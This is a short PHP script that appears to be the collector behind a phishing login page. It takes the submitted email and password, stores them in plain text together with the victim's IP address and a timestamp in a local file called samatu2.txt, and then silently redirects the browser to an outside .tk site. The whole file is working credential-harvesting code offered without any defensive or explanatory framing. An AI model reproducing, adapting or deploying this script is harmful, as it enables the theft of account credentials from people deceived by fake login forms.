<?php
$Username=$_POST['email'];
$Password=$_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$time=time();
$gmt='+7';
$jm='3600';
$var=$time+($gmt*$jm);
$now=gmdate('d M Y - H:i',$var);
$handle=fopen('samatu2.txt',a);
$save=fwrite($handle,'*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
Username : '.$Username.'
Password : '.$Password.'
IP Address : '.$ip.'
Date Submitted : '.$now.'
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
');
fclose($handle);
echo '
<head>
<meta http-equiv="Refresh" content="0; URL=http://nugividmate.tk/"/>
</head>
<body></body>
</html>
';
?>
